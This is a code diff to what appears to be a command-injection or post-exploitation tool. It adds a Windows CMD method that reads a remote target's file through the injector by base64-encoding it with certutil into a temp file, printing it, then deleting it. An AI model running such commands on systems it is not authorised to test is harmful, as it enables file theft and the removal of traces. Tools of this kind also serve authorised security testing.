@@ -69,6 +69,8 @@ class DownloadFileCommandSet(CommandSet):
             self.remote_file_size = self.windows_psh_remote_file_size
             self.get_base64_encoded_file_content = self.windows_psh_get_base64_encoded_file_content
             self.get_base64_encoded_chunk = self.windows_psh_get_base64_encoded_chunk
+        elif self._cmd.injector.is_windows_cmd():
+            self.get_base64_encoded_file_content = self.windows_cmd_get_base64_encoded_file_content
     
     @with_argparser(argument_parser)
     def do_download(self, args) -> None:
@@ -134,3 +136,17 @@ class DownloadFileCommandSet(CommandSet):
 
     def windows_psh_remote_file_size(self, filename: str) -> int:
         return self._cmd.injector.execute(f"(Get-Item -Path '{filename}').Length")
+
+
+    #
+    # Windows CMD implementation
+    #
+
+    def windows_cmd_get_base64_encoded_file_content(self, filename: str) -> str:
+        temp_filename = f"%TEMP%/{utils.random_string()}"
+        base64_output = self._cmd.injector.execute(
+            f"certutil -encodehex -f '{filename}' {temp_filename} 0x40000001>nul&& \
+            type {temp_filename} && \
+            del {temp_filename}"
+        )
+        return base64_output
